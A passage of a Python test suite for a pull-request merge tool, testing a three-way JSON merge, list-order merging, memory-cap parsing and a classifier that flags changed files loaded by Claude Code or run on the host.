    return git(root, 'rev-parse', 'HEAD')


def make_repo(dst, real=False):
    """A main checkout on master with one commit: copies of the scripts, the real or the mini plan, rendered."""
    dst.mkdir(parents=True)
    for rel in (PLAN_REL + '/plan.py', PLAN_REL + '/worktree.py', MERGE_REL, CAP_REL):
        (dst / rel).parent.mkdir(parents=True, exist_ok=True)
        shutil.copy(ROOT / rel, dst / rel)
    write(dst, '.gitignore', GITIGNORE)
    write(dst, '96-Local Testing/03-consistency.py', STUB_CONSISTENCY)
    write(dst, 'notes.txt', 'line 1\nline 2\n')
    if real:
        for rel in (PLAN_REL + '/batches.json', PJ, '01-prompts.md'):
            shutil.copy(ROOT / rel, dst / rel)
    else:
        write(dst, PLAN_REL + '/batches.json', json.dumps(MINI_BATCHES, indent=2) + '\n')
        write(dst, PJ, json.dumps(MINI_PACKAGES, indent=2) + '\n')
        for rel, text in MINI_FILES.items():
            write(dst, rel, text)
        for rel, (name, mb) in GATE_STUBS.items():
            write(dst, rel, gate_stub(name, mb))
    REAL_RUN([sys.executable, str(dst / PLAN_REL / 'plan.py'), 'render'], cwd=dst, env=ISOLATED, check=True, capture_output=True)
    git(dst, 'init', '-q', '-b', 'master')
    git(dst, 'config', 'user.name', 'Repo User')
    git(dst, 'config', 'user.email', 'repo@example.invalid')
    commit(dst, 'init')
    return dst


def add_worktree(main, name, branch, start='master'):
    wt = main / '.claude/worktrees' / name
    git(main, 'worktree', 'add', '-q', '-b', branch, str(wt), start)
    return wt


def packages(root):
    return json.loads((root / PJ).read_text())


def save_packages(root, pk):
    (root / PJ).write_text(json.dumps(pk, indent=2, ensure_ascii=False) + '\n')


def plan_cmd(root, *args):
    r = REAL_RUN([sys.executable, str(root / PLAN_REL / 'plan.py'), *args], cwd=root, env=ISOLATED, capture_output=True, text=True)
    if r.returncode:
        raise RuntimeError(f'plan.py {args} failed in {root}: {r.stdout}{r.stderr}')


def sandbox_reason():
    if not shutil.which('bwrap'):
        return 'bwrap is not installed'
    if not _00_memory_cap.available():
        return 'no memory-capped systemd user scope (systemd-run --user --scope)'
    r = REAL_RUN(['bwrap', '--ro-bind', '/', '/', '--dev', '/dev', '--proc', '/proc', '--unshare-net', '--unshare-pid', 'true'],
                 capture_output=True, text=True)
    return f'bwrap cannot create namespaces here: {r.stderr.strip()}' if r.returncode else None


FAKE_GH = r'''import json, os, sys
d, args = os.environ['FAKE_GH_DIR'], sys.argv[1:]
with open(os.path.join(d, 'calls.jsonl'), 'a') as f:
    f.write(json.dumps(args) + '\n')
key = {('pr', 'view'): 'view'}.get(tuple(args[:2]), 'other')
p = lambda ext: os.path.join(d, key + ext)
if os.path.exists(p('.fail')):
    sys.stderr.write(open(p('.fail')).read())
    sys.exit(1)
if not os.path.exists(p('.out')):
    sys.stderr.write('fake gh: no fixture for ' + key + '\n')
    sys.exit(4)
out = open(p('.out')).read()
if '--json' in args:  # like gh: only the requested fields
    full = json.loads(out)
    out = json.dumps({k: full[k] for k in args[args.index('--json') + 1].split(',') if k in full})
sys.stdout.write(out)
'''


class Base(unittest.TestCase):
    BASE = '/tmp'
    SANDBOX = False

    @classmethod
    def setUpClass(cls):
        cls.skip = sandbox_reason() if cls.SANDBOX else None

    def setUp(self):
        if self.skip:
            self.skipTest('SKIP: ' + self.skip)
        self.tmp = Path(tempfile.mkdtemp(prefix='merge-tester-', dir=self.BASE))
        # a failed test keeps its fixture directory, which its failure message names
        self.addCleanup(self.cleanup)
        self.fake, self.bin = self.tmp / 'gh-fixtures', self.tmp / 'bin'
        for d in (self.fake, self.bin):
            d.mkdir()
        (self.tmp / 'fake_gh.py').write_text(FAKE_GH)
        gh = self.bin / 'gh'
        gh.write_text(f'#!/bin/sh\nexec {shlex.quote(sys.executable)} {shlex.quote(str(self.tmp / "fake_gh.py"))} "$@"\n')
        gh.chmod(0o755)
        (self.bin / 'git').symlink_to(shutil.which('git') or '/usr/bin/git')

    def cleanup(self):
        res = self._outcome.result
        if self._outcome.success and not any(t is self for t, _ in res.failures + res.errors):
            for wt in self.tmp.glob('**/.claude/worktrees/*'):
                shutil.rmtree(wt, ignore_errors=True)
            shutil.rmtree(self.tmp, ignore_errors=True)

    def info(self, **kw):
        return f'seed={SEED} mode={MODE} fixture={self.tmp} ' + ' '.join(f'{k}={v}' for k, v in kw.items())

    def env(self, role='maintainer', full_path=False, cfg=()):
        e = dict(ISOLATED, PATH=str(self.bin) + (os.pathsep + os.environ.get('PATH', '') if full_path else ''),
                 FAKE_GH_DIR=str(self.fake), GIT_ALLOW_PROTOCOL='file')
        items = ([('compprog.role', role)] if role else []) + [(f'url.{self.tmp}/remote/.insteadOf', 'https://github.com/'), *cfg]
        e['GIT_CONFIG_COUNT'] = str(len(items))
        for i, (k, v) in enumerate(items):
            e[f'GIT_CONFIG_KEY_{i}'], e[f'GIT_CONFIG_VALUE_{i}'] = k, v
        return e

    def mp(self, *args, script=None, **kw):
        """Run the synthetic main checkout's merge_pr.py copy from that checkout."""
        return REAL_RUN([sys.executable, str(script or self.main / MERGE_REL), *map(str, args)], cwd=self.main, capture_output=True,
                        text=True, env=self.env(**kw), timeout=600)

    def calls(self):
        f = self.fake / 'calls.jsonl'
        out = [json.loads(l) for l in f.read_text().splitlines()] if f.exists() else []
        f.unlink(missing_ok=True)
        return out

    def state_file(self, n=7):
        return self.main / '.claude/merge-pr' / f'{n}.json'


class Units(Base):
    """merge3, order and mb_of as pure functions."""

    def m3(self, b, o, t, where='packages.json'):
        snap = json.dumps([x for x in (b, o, t) if x is not M], sort_keys=True)
        clashes = []
        r = WT.merge3(b, o, t, where, clashes)
        self.assertEqual(json.dumps([x for x in (b, o, t) if x is not M], sort_keys=True), snap, 'merge3 mutated an input')
        return r, clashes

    def test_merge3_exact(self):
        A = lambda **kw: {'id': 'A', 'n': 1, **kw}
        B = lambda **kw: {'id': 'B', 'n': 1, **kw}
        cases = [
            ((1, 1, 2), 2, []), ((1, 2, 1), 2, []), ((1, 2, 2), 2, []), ((1, 2, 3), 2, ['packages.json']),
            ((M, M, 5), 5, []), ((M, 5, M), 5, []), ((5, M, 5), M, []), ((5, 5, M), M, []), ((5, M, M), M, []),
            ((5, M, 6), M, ['packages.json']), ((M, 5, 6), 5, ['packages.json']), ((M, 5, 5), 5, []),
            (({'a': 1, 'b': 2}, {'a': 1, 'b': 3}, {'a': 4, 'b': 2, 'c': 5}), {'a': 4, 'b': 3, 'c': 5}, []),
            (({'a': 1, 'b': 2}, {'a': 1}, {'a': 9, 'b': 2}), {'a': 9}, []),
            (({'a': 1, 'b': 2}, {'a': 1, 'b': 2}, {'a': 1}), {'a': 1}, []),
            (({'a': 1, 'b': 2}, {'a': 1}, {'a': 1, 'b': 7}), {'a': 1}, ['packages.json.b']),
            (({'a': 1}, {'a': 1, 'c': 3}, {'a': 1, 'c': 3}), {'a': 1, 'c': 3}, []),
            (({'a': 1}, {'a': 1, 'c': 3}, {'a': 1, 'c': 4}), {'a': 1, 'c': 3}, ['packages.json.c']),
            (({'m': {'x': 1}}, {'m': {'x': 1, 'y': 2}}, {'m': {}}), {'m': {'y': 2}}, []),
            (({'p': [A(), B()]}, {'p': [A(n=2), B()]}, {'p': [A(), B(n=3), {'id': 'C', 'n': 0}]}),
             {'p': [A(n=2), B(n=3), {'id': 'C', 'n': 0}]}, []),
            (({'p': [A(), B()]}, {'p': [A(n=2), B()]}, {'p': [A(n=3), B()]}), {'p': [A(n=2), B()]}, ['packages.json.p[A].n']),
            (({'p': [A(), B()]}, {'p': [B()]}, {'p': [A(), B(n=4)]}), {'p': [B(n=4)]}, []),
            (({'p': [A(), B()]}, {'p': [B()]}, {'p': [A(n=5), B()]}), {'p': [B()]}, ['packages.json.p[A]']),
            (({'p': [A()]}, {'p': [A(x=1)]}, {'p': [A(y=2)]}), {'p': [A(x=1, y=2)]}, []),
            (({'p': [A()]}, {'p': [A(), {'id': 'N', 'v': 1}]}, {'p': [A(), {'id': 'N', 'v': 2}]}), {'p': [A(), {'id': 'N', 'v': 1}]},
             ['packages.json.p[N]']),
            (({'e': ['x']}, {'e': ['x', 'y']}, {'e': ['x', 'z']}), {'e': ['x', 'y']}, ['packages.json.e']),
            (({'e': []}, {'e': ['y']}, {'e': ['z']}), {'e': ['y']}, ['packages.json.e']),
            (({'e': ['x']}, {'e': []}, {'e': ['x', 'z']}), {'e': []}, ['packages.json.e']),
            (({'l': [{'k': 1}]}, {'l': [{'k': 2}]}, {'l': [{'k': 3}]}), {'l': [{'k': 2}]}, ['packages.json.l']),
            (({'s': 'a', 't': 1}, {'s': 'b', 't': 2}, {'s': 'c', 't': 3}), {'s': 'b', 't': 2}, ['packages.json.s', 'packages.json.t']),
            (({'d': {'k': 1}}, {'d': 'str'}, {'d': {'k': 2}}), {'d': 'str'}, ['packages.json.d']),
        ]
        for (b, o, t), want, wclash in cases:
            r, clashes = self.m3(b, o, t)
            if not wclash:
                self.assertEqual(r, want, f'merge3({b!r}, {o!r}, {t!r})')
                if isinstance(want, dict) and 'p' in want:
                    self.assertEqual([e['id'] for e in r['p']], [e['id'] for e in want['p']], f'entry order of merge3({b!r}, {o!r}, {t!r})')
            self.assertEqual(sorted(clashes), sorted(wclash), f'clashes of merge3({b!r}, {o!r}, {t!r})')
        r, clashes = self.m3({'packages': [A()]}, {'packages': [A(note='o')]}, {'packages': [A(note='t')]})
        self.assertEqual(clashes, ['packages.json.packages[A].note'])

    def check_random(self, base, a, b):
        """Error text when merge3 disagrees with the brute-force oracle on base edited by a (ours) and b (theirs)."""
        ours, theirs = apply_ops(base, a), apply_ops(base, b)
        clashes, want = [], []
        r = WT.merge3(base, ours, theirs, 'packages.json', clashes)
        exp = o_merge('doc', base, ours, theirs, 'packages.json', want)
        if sorted(clashes) != sorted(want):
            return f'clashes {sorted(clashes)} != {sorted(want)}'
        if not want:
            if len({e['id'] for e in r['packages']}) != len(r['packages']):  # a repeated id passed only by a short-circuit: kept verbatim
                return None if o_canon(r) == o_canon(exp) else f'merged {o_canon(r)} != {o_canon(exp)}'
            if norm(r) != norm(exp):
                return f'merged {json.dumps(r, sort_keys=True)} != {json.dumps(norm(exp), sort_keys=True)}'
            ids = [[e['id'] for e in x['packages']] for x in (base, ours, theirs)]
            survivors = set(norm(exp)['packages'])
            primary, _ = o_primary(*ids)
            got = [e['id'] for e in r['packages']]
            if [i for i in got if i in primary] != [i for i in primary if i in survivors] or err_order(ids, got, survivors):
                return f'entry order {got} (base, ours, theirs ids {ids})'
        return None

    def run_random(self, name, n, gen):
        rng = random.Random(f'{SEED}-{name}')
        for rd in range(n):
            base, a, b, check = gen(rng)
            err = check(base, a, b)
            if err:
                a, b = shrink(lambda x, y: check(base, x, y), a, b)
                self.fail(self.info(test=name, round=rd, error=check(base, a, b), base=json.dumps(base), ours_ops=a, theirs_ops=b))

    def test_merge3_random(self):
        def gen(rng):
            base = r_doc(rng, rng.randint(1, 6))
            ids = [e['id'] for e in base['packages']]
            new = ['P900', 'P901', 'P902']
            return (base, r_ops(rng, base, 'a', ids, rng.randint(0, 6), ('date', 'models'), new, dups=True),
                    r_ops(rng, base, 'b', ids, rng.randint(0, 6), ('date', 'models'), new, dups=True), self.check_random)
        self.run_random('general', rounds(20, 300, 30), gen)

    def test_merge3_disjoint_random(self):
        def check(base, a, b):
            ours, theirs = apply_ops(base, a), apply_ops(base, b)
            clashes = []
            r = WT.merge3(base, ours, theirs, 'packages.json', clashes)
            want = apply_ops(base, a + b)
            if clashes:
                return f'disjoint edits clashed: {clashes}'
            if norm(r) != norm(want):
                return f'merged {json.dumps(r, sort_keys=True)} lacks an edit: want {json.dumps(norm(want), sort_keys=True)}'
            return self.check_random(base, a, b)

        def gen(rng):
            base = r_doc(rng, rng.randint(2, 8))
            ids = [e['id'] for e in base['packages']]
            rng.shuffle(ids)
            cut = rng.randint(0, len(ids))
            mine, yours = ids[:cut], ids[cut:]
            return (base, r_ops(rng, base, 'a', mine, rng.randint(0, 6), ('date',), ['P900', 'P901']),
                    r_ops(rng, base, 'b', yours, rng.randint(0, 6), ('models',), ['P910', 'P911']), check)
        self.run_random('disjoint', rounds(10, 150, 15), gen)

    def test_merge3_same_field_random(self):
        rng = random.Random(f'{SEED}-same')
        for rd in range(rounds(10, 150, 15)):
            base = r_doc(rng, rng.randint(2, 7))
            ids = [e['id'] for e in base['packages']]
            pid, rest = ids[0], ids[1:]
            cut = rng.randint(0, len(rest))
            a = r_ops(rng, base, 'a', rest[:cut], rng.randint(0, 4), drops=True)
            b = r_ops(rng, base, 'b', rest[cut:], rng.randint(0, 4), drops=True)
            kind = rng.choice(['field', 'field', 'sub', 'del-vs-set', 'drop-vs-set', 'equal', 'both-del'])
            f = rng.choice(FIELDS)
            if kind == 'field':
                a, b, want = a + [('set', pid, f, r_value(f, 'A'))], b + [('set', pid, f, r_value(f, 'B'))], [f'packages.json.packages[{pid}].{f}']
                if f == 'extra':  # {'a': A} vs {'a': B}: a clashes, b is deleted on both sides
                    want = [f'packages.json.packages[{pid}].extra.a']
            elif kind == 'sub':
                k = rng.choice('abc')
                a, b, want = a + [('sub', pid, k, 'A')], b + [('sub', pid, k, 'B')], [f'packages.json.packages[{pid}].extra.{k}']
            elif kind == 'del-vs-set':
                a, b, want = a + [('set', pid, f, None)], b + [('set', pid, f, r_value(f, 'B'))], [f'packages.json.packages[{pid}].{f}']
                if rng.random() < 0.5:
                    a, b = b, a
            elif kind == 'drop-vs-set':
                a, b, want = a + [('drop', pid)], b + [('set', pid, f, r_value(f, 'B'))], [f'packages.json.packages[{pid}]']
                if rng.random() < 0.5:
                    a, b = b, a
            elif kind == 'equal':
                a, b, want = a + [('set', pid, f, r_value(f, 'S'))], b + [('set', pid, f, r_value(f, 'S'))], []
            else:
                a, b, want = a + [('set', pid, f, None)], b + [('set', pid, f, None)], []
            clashes = []
            WT.merge3(base, apply_ops(base, a), apply_ops(base, b), 'packages.json', clashes)
            self.assertEqual(clashes, want, self.info(round=rd, kind=kind, base=json.dumps(base), ours_ops=a, theirs_ops=b))
            if not want:
                self.assertIsNone(self.check_random(base, a, b), self.info(round=rd, kind=kind, base=json.dumps(base), ours_ops=a, theirs_ops=b))

    def test_merge3_strict(self):
        """Canonical JSON comparison (1, 1.0 and true differ, key order does not), string ids, repeated ids."""
        A = lambda **kw: {'id': 'A', 'n': 1, **kw}
        B = {'id': 'B', 'n': 1}
        rep = ['packages.json.p (repeated id)']
        cases = [((1, 1.0, 1), 1.0, []), ((1, 1, 1.0), 1.0, []), ((1, True, 1.0), True, ['packages.json']), ((0, False, 0.0), False, ['packages.json']),
                 ((1, True, True), True, []), ((None, 0, False), 0, ['packages.json']), (('1', 1, '1'), 1, []),
                 (({'a': 1, 'b': 2}, {'b': 2, 'a': 1}, {'a': 1, 'b': 3}), {'a': 1, 'b': 3}, []),
                 (({'a': 1}, {'a': 1.0}, {'a': True}), {'a': 1.0}, ['packages.json.a']), (([1], [1.0], [True]), [1.0], ['packages.json']),
                 (({'p': [A()]}, {'p': [A(), A(n=2)]}, {'p': [A(), B]}), {'p': [A(), A(n=2)]}, rep),
                 (({'p': [A()]}, {'p': [A(), A()]}, {'p': [A(), A()]}), {'p': [A(), A()]}, []),
                 (({'p': [A()]}, {'p': [A(), A(n=2)]}, {'p': [A()]}), {'p': [A(), A(n=2)]}, []),
                 (({'p': [A()]}, {'p': [A()]}, {'p': [A(), A(n=3)]}), {'p': [A(), A(n=3)]}, []),
                 (({'p': [A(), A()]}, {'p': [A()]}, {'p': [A(), B]}), {'p': [A()]}, rep),
                 (({'p': [A()]}, {'p': [A(n=5)]}, {'p': [B, B]}), {'p': [A(n=5)]}, rep),
                 (({'p': [{'id': '1', 'n': 0}]}, {'p': [{'id': '1', 'n': 1}]}, {'p': [{'id': '1', 'n': 0}, {'id': '2'}]}),
                  {'p': [{'id': '1', 'n': 1}, {'id': '2'}]}, []),
                 (({'p': [{'id': 1, 'n': 0}]}, {'p': [{'id': 1, 'n': 1}]}, {'p': [{'id': 1, 'n': 0}, {'id': 2}]}),
                  {'p': [{'id': 1, 'n': 1}]}, ['packages.json.p']),
                 (({'p': [{'id': 'a'}]}, {'p': [{'id': 'a'}, {'x': 1}]}, {'p': [{'id': 'a'}, {'y': 2}]}), {'p': [{'id': 'a'}, {'x': 1}]},
                  ['packages.json.p']),
                 (({'p': [{'id': 'a', 'v': 1}]}, {'p': [{'id': 'a', 'v': 1.0}]}, {'p': [{'id': 'a', 'v': 1}, {'id': 'b'}]}),
                  {'p': [{'id': 'a', 'v': 1.0}, {'id': 'b'}]}, [])]
        for (b, o, t), want, wclash in cases:
            r, clashes = self.m3(b, o, t)
            info = f'merge3({b!r}, {o!r}, {t!r})'
            self.assertEqual(clashes, wclash, info)
            self.assertEqual(json.dumps(r, sort_keys=True), json.dumps(want, sort_keys=True), info)
            oc = []
            kind = 'doc' if isinstance(b, dict) and 'p' not in b else 'leaf'
            if isinstance(b, dict) and 'p' in b:
                CHILD['doc']['p'] = 'ids'
                try:
                    o_merge('doc', b, o, t, 'packages.json', oc)
                finally:
                    del CHILD['doc']['p']
            else:
                o_merge(kind, b, o, t, 'packages.json', oc)
            self.assertEqual(sorted(oc), sorted(wclash), f'oracle {info}')

    def test_order_exact(self):
        L = list
        cases = [('ABC', 'ABC', 'ABC', 'ABC'), ('ABC', 'ABDC', 'ABCE', 'ABDCE'), ('ABC', 'ABC', 'CBA', 'CBA'), ('ABC', 'BAC', 'CBA', 'BAC'),
                 ('ABC', 'ABC', 'XABC', 'XABC'), ('ABC', 'ABDC', 'CAB', 'CABD'), ('ABC', 'AC', 'ABC', 'ABC'), ('ABC', 'ABC', 'CA', 'CAB'),
                 ('ABC', 'XYABC', 'ABC', 'XYABC'), ('ABC', 'ABC', 'AXYBC', 'AXYBC'), ('', 'AB', 'CD', 'CDAB'), ('', '', 'CD', 'CD'),
                 ('AB', 'BA', 'ABX', 'BXA'), ('ABCD', 'ABCD', 'DCBXA', 'DCBXA'), ('ABCD', 'BADC', 'ABXCD', 'BXADC'),
                 ('ABC', 'B', 'C', 'CB'), ('ABC', 'AC', 'BA', 'BA' + 'C')]
        for base, ours, theirs, want in cases:
            got = WT.order(L(base), L(ours), L(theirs))
            self.assertEqual(''.join(got), want, f'order({base!r}, {ours!r}, {theirs!r})')
            self.assertIsNone(o_order_check(L(base), L(ours), L(theirs), got), f'oracle disagrees on order({base!r}, {ours!r}, {theirs!r})')

    def test_order_random(self):
        rng = random.Random(f'{SEED}-order')
        for rd in range(rounds(50, 1000, 100)):
            pool = [f'P{i}' for i in range(rng.randint(0, 9))]
            base = rng.sample(pool, rng.randint(0, len(pool)))

            def side(drop):
                x = [i for i in base if rng.random() > drop]
                if rng.random() < 0.4:
                    rng.shuffle(x)
                for i in pool:
                    if i not in base and rng.random() < 0.3:
                        x.insert(rng.randint(0, len(x)), i)
                return x
            ours, theirs = side(0.2), side(0.2)
            got = WT.order(list(base), list(ours), list(theirs))
            self.assertIsNone(o_order_check(base, ours, theirs, got), self.info(round=rd, base=base, ours=ours, theirs=theirs))

    def test_mb_of(self):
        main = MP.cap.MAIN_MB
        self.assertEqual(main, int(os.environ.get('CP_TEST_MEMORY_MB', '4096')))
        for text, want in (('_00_memory_cap.ensure(mb=512)\n', 512), ('_00_memory_cap.ensure(force=True, mb=99999)\n', MP.MAX_MB),
                           ('_00_memory_cap.ensure()\n', main), ('x = 1\n', main), (f'ensure(mb={MP.MAX_MB})', MP.MAX_MB),
                           ('ensure(mb=0)', 0)):
            write(self.tmp, 's_tester.py', text)
            self.assertEqual(MP.mb_of(self.tmp, 's_tester.py'), want, text)
        for raw, want in ((b'# \xe9t\xe9 (latin-1)\n_00_memory_cap.ensure(mb=512)\n', 512), (b'\xff\xfe\x00ensure(mb=99999)', MP.MAX_MB), (b'\x80\n', main)):
            (self.tmp / 's_tester.py').write_bytes(raw)
            self.assertEqual(MP.mb_of(self.tmp, 's_tester.py'), want, raw)
        self.assertEqual(MP.MAX_MB, 16384)


def err_order(ids, got, survivors):
    """The order oracle applied to the surviving ids."""
    base, ours, theirs = ids
    full = WT_ORDER_FREE(base, ours, theirs)
    return [i for i in full if i in survivors] != got


def WT_ORDER_FREE(base, ours, theirs):
    """The merged order rebuilt from its characterisation: primary side, then each id only the other side has right
    after its predecessor in that side's list, or first."""
    primary, other = o_primary(base, ours, theirs)
    res = list(primary)
    for k, i in enumerate(other):
        if i not in primary:
            res.insert(res.index(other[k - 1]) + 1 if k else 0, i)
    return res


class Classify(Base):
    """changes() and LIBRARY on commits built from {path: (mode, content)} trees."""

    def setUp(self):
        super().setUp()
        self.repo = self.tmp / 'repo'
        self.repo.mkdir()
        git(self.repo, 'init', '-q', '-b', 'master')
        self.blobs = {}

    def tree_commit(self, tree, parent=None):
        idx = self.tmp / 'index'
        idx.unlink(missing_ok=True)
        env = dict(ISOLATED, GIT_INDEX_FILE=str(idx))
        recs = []
        for path, (mode, content) in tree.items():
            if mode == '160000':
                sha = content
            else:
                if content not in self.blobs:
                    self.blobs[content] = git(self.repo, 'hash-object', '-w', '--stdin', input=content)
                sha = self.blobs[content]
            recs.append(f'{mode} {sha}\t{path}\0')
        git(self.repo, 'update-index', '-z', '--index-info', env=env, input=''.join(recs))
        t = git(self.repo, 'write-tree', env=env)
        cenv = dict(ISOLATED, GIT_AUTHOR_NAME='a', GIT_AUTHOR_EMAIL='a@x', GIT_COMMITTER_NAME='a', GIT_COMMITTER_EMAIL='a@x')
        return git(self.repo, 'commit-tree', t, *(['-p', parent] if parent else []), '-m', 'c', env=cenv)

    def changes(self, base, head):
        real = MP.git
        with patch.object(MP, 'git', lambda *a, cwd=None, check=True: real(*a, cwd=self.repo, check=check)), \
                patch.dict(os.environ, ISOLATED, clear=True):
            return MP.changes(base, head)

    def check(self, base, head, prompts=('', ''), **kw):
        """changes() against o_rows; a symlink or gitlink whose mode changes (or that is deleted) is left to
        test_classify_old_mode (only its status is compared here)."""
        b = self.tree_commit(base)
        h = self.tree_commit(head, b)
        gone = {p for p, (m, _) in base.items() if m in ('120000', '160000') and head.get(p, ('000000',))[0] != m}
        mask = lambda rows: sorted((s, p, '*' if p in gone else w) for s, p, w in rows)
        self.assertEqual(mask(self.changes(b, h)), mask(o_rows(base, head, prompts)), self.info(base=base, head=head, **kw))

    def test_classify_old_mode(self):
        base = {'02-Data Structures/was-link': ('120000', 't'), '03-Geometry/was-sub': ('160000', '1' * 40),
                '04-Graphs/gone-link': ('120000', 't'), '05-Mathematics/gone-sub': ('160000', '2' * 40), 'x': ('100644', 'x')}
        head = {'02-Data Structures/was-link': ('100644', 't'), '03-Geometry/was-sub': ('100644', 'f'), 'x': ('100644', 'x')}
        b = self.tree_commit(base)
        got = sorted(self.changes(b, self.tree_commit(head, b)))
        self.assertEqual(got, [('D', '04-Graphs/gone-link', 'symlink'), ('D', '05-Mathematics/gone-sub', 'submodule'),
                               ('T', '02-Data Structures/was-link', 'symlink'), ('T', '03-Geometry/was-sub', 'submodule')],
                         self.info(note='the old mode of a changed path must count too'))

    def test_classify_exact(self):
        lib = ['01-Core/01-x.hpp', '07-Strings/Docs/00-notes.md', '08-Python/a/b c.py', '96-Local Testing/01-Core/01-x_tester.py',
               '96-Local Testing/08-Python/x.py', '96-Local Testing/00-index.md', '97-Online Testing/src/a.cpp',
               '97-Online Testing/Docs/x.md', '00-Guidelines/Ledgers/a.json', '00-Guidelines/23-Sweep Ledgers/b.md',
               '00-Guidelines/13-Plan/packages.json', '00-Guidelines/13-Plan/finish-log.tsv', '02-Data Structures/Docs/sub/deep.md',
               '98-Team Notebook/02-selection.json', '98-Team Notebook/Articles/a.tex', '98-Team Notebook/Articles/sub/b c.md']
        out = ['.claude/skills/x/SKILL.md', '00-Guidelines/01-principles.md', '96-Local Testing/01-run.py',
               '96-Local Testing/00-Tools/10-merge_tester.py', '96-Local Testing/_00_memory_cap.py', '09-Contest Testing/a.py',
               '98-Team Notebook/x.tex', 'OLD/a.cpp', 'CLAUDE.md', '.gitattributes', '00-Guidelines/13-Plan/plan.py',
               '00-Guidelines/13-Plan/batches.json', '00-Guidelines/Ledgers/sub/x.json', '97-Online Testing/03-workspace.py',
               '97-Online Testing/srcx/a', '96-Local Testing/09-Contest/x', '05-Mathematics', '01-/x', '0a-x/y', '09-x/y',
               '96-Local Testing/0-x/y', '96-Local Testing/00-index.md.bak', '010-x/y', 'x/01-Core/y.hpp', '98-Team Notebook/01-notebook.py',
               '98-Team Notebook/02-selection.json.bak', '98-Team Notebook/x/02-selection.json', '98-Team Notebook/Articlesx/a', '95-Resources/a.pdf',
               '95-Resources/Articles/a.tex', '98-Team Notebook/notebook.pdf']
        for p in ('98-Team Notebook/Articles', '98-Team Notebook/02-selection.json/x', 'x/98-Team Notebook/Articles/a'):
            self.assertFalse(o_library(p) or MP.LIBRARY.fullmatch(p), p)
        for p in lib:
            self.assertTrue(o_library(p) and MP.LIBRARY.fullmatch(p), p)
        for p in out:
            self.assertFalse(o_library(p) or MP.LIBRARY.fullmatch(p), p)
        sha = '1' * 40
        base = {p: ('100644', 'v1') for p in lib[:4] + out[:3]}
        base |= {'02-Data Structures/link': ('120000', 'target'), '03-Geometry/sub': ('160000', sha), '04-Graphs/became-link': ('100644', 'v1'),
                 '04-Graphs/was-link': ('120000', 't'), '05-Mathematics/x.hpp': ('100644', 'v1'), '06-Miscellaneous/gone.hpp': ('100644', 'v1')}
        head = {p: ('100644', 'v2') for p in lib + out}
        head |= {'02-Data Structures/link': ('120000', 'target2'), '03-Geometry/sub': ('160000', '2' * 40), '04-Graphs/became-link': ('120000', 'v1'),
                 '04-Graphs/was-link': ('100644', 't'), '05-Mathematics/x.hpp': ('100755', 'v1'), '07-Strings/new-link': ('120000', 'z'),
                 '08-Python/mod': ('160000', sha)}
        head.pop('05-Mathematics')  # a file and a folder cannot share the path
        base['05-Mathematics'] = ('100644', 'file')
        del base['05-Mathematics/x.hpp'], head['05-Mathematics/x.hpp']
        base['04-Graphs/x.hpp'], head['04-Graphs/x.hpp'] = ('100644', 'v1'), ('100755', 'v1')
        self.check(base, head)
        rows = {p: w for _, p, w in self.changes(self.tree_commit(base), self.tree_commit(head, self.tree_commit(base)))}
        self.assertEqual((rows['02-Data Structures/link'], rows['03-Geometry/sub'], rows['04-Graphs/became-link'], rows['08-Python/mod'],
                          rows['01-Core/01-x.hpp'], rows['CLAUDE.md'], rows['04-Graphs/x.hpp']),
                         ('symlink', 'submodule', 'symlink', 'submodule', '', 'outside library code; loaded by Claude Code', ''))
        hidden = ['02-Data Structures/CLAUDE.md', '02-Data Structures/.gitignore', '96-Local Testing/02-Data Structures/.claude/x',
                  '01-Core/AGENTS.md', '01-Core/CLAUDE.local.md', '07-Strings/.hidden/a.hpp', '00-Guidelines/Ledgers/.x', '97-Online Testing/src/.y',
                  '08-Python/__pycache__/_05_x.cpython-314.pyc', '08-Python/_05_x.pyc', '08-Python/_05_x.cpython-314-x86_64-linux-gnu.so',
                  '96-Local Testing/08-Python/a.so']
        shown = ['08-Python/x__pycache__/a.py', '08-Python/a.pyc.py', '08-Python/a.sox', '01-Core/xCLAUDE.md', '01-Core/AGENTS.md.bak', '01-Core/CLAUDE.mdx', '01-Core/CLAUDE.m', '02-Data Structures/a.CLAUDE.md']
        for p in hidden + shown:
            self.assertTrue(o_library(p), p)
        head = {p: ('100644', 'h') for p in hidden + shown}
        self.check({}, head)
        rows = {p: w for _, p, w in self.changes(self.tree_commit({}), self.tree_commit(head, self.tree_commit({})))}
        agent = {'02-Data Structures/CLAUDE.md', '01-Core/AGENTS.md', '01-Core/CLAUDE.local.md', '96-Local Testing/02-Data Structures/.claude/x'}
        self.assertEqual(rows, {**{p: 'outside library code' + '; loaded by Claude Code' * (p in agent) for p in hidden}, **{p: '' for p in shown}})
        host, agt, plain = '; runs on the host at checkout', '; loaded by Claude Code', ''
        tags = {'96-Local Testing/03-consistency.py': host, '96-Local Testing/02-integration.py': host, '96-Local Testing/_00_memory_cap.py': host,
                '96-Local Testing/_00_cpp_test_runner.py': host, '98-Team Notebook/01-notebook.py': host, '98-Team Notebook/05-dependencies.py': host,
                '00-Guidelines/13-Plan/plan.py': host, '.claude/skills/setup-check/setup_check.py': host, '.claude/settings.json': agt,
                '.claude/hooks/guard.py': agt, '.claude/skills/merge-pr/merge_pr.py': agt, 'CLAUDE.md': agt, 'AGENTS.md': agt, 'CLAUDE.local.md': agt,
                '05-Mathematics/CLAUDE.local.md': agt, '96-Local Testing/02-Data Structures/AGENTS.md': agt, '09-Contest Testing/CLAUDEx.md': agt,
                '96-Local Testing/01-run.py': host, '96-Local Testing/03-consistency.pyc': host, '96-Local Testing/json.so': host, '96-Local Testing/x.pycx': plain, '96-Local Testing/00-Tools/03-consistency.py': plain,
                'x/96-Local Testing/03-consistency.py': plain, '00-Guidelines/13-Plan/worktree.py': host, '00-Guidelines/13-Plan/x/plan.py': host,
                '96-Local Testing/hashlib.py': host, '96-Local Testing/json/__init__.py': host, '96-Local Testing/0x/__init__.py': plain,
                '98-Team Notebook/03-x.py': plain, '95-Resources/a.pdf': plain, '.gitattributes': plain, '.claudex/a': plain, 'x/.claude/y': agt,
                '.mcp.json': agt, 'x/.mcp.json': plain,
                '.claude/skills/setup-check/setup_check.pyc': agt, '09-Contest Testing/CLAUDE.mdx': plain, '98-Team Notebook/Articles.md': plain}
        head = {p: ('100644', 't') for p in tags}
        self.check({}, head)
        rows = {p: w for _, p, w in self.changes(self.tree_commit({}), self.tree_commit(head, self.tree_commit({})))}
        self.assertEqual(rows, {p: 'outside library code' + t for p, t in tags.items()})
        head = {p: ('120000', 't') for p in sorted(O_HOST_RUN)} | {'.claude/x': ('160000', '3' * 40)}
        self.check({}, head)
